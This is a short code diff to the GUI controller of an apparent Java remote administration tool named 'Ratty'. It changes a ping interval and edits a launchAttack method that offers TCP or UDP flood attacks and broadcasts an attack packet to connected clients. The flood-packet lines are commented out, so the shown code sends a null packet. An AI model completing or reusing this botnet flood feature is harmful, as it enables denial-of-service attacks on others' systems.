@@ -134,7 +134,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String RAM = LANGUAGE.getString("information.ram");
 	
 	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
-	private static final long PING_INTERVAL = 3000;
+	private static final long PING_INTERVAL = 5000;
 	private static final long NOTIFICATION_DELAY = 5000;
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
@@ -477,12 +477,14 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private void launchAttack() {
 		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
 		
-		AttackPacket packet = null;
+		final AttackPacket packet = null;
 		
 		if (input == JOptionPane.YES_OPTION) {
-			//TCP flood packet
+			//packet = new AttackPacket(AttackPacket.TCP, address, port, duration);
 		} else if (input == JOptionPane.NO_OPTION) {
-			//UDP flood packet
+			//packet = new AttackPacket(AttackPacket.UDP, address, port, duration);
+		} else {
+			return;
 		}
 		
 		broadcast(packet);
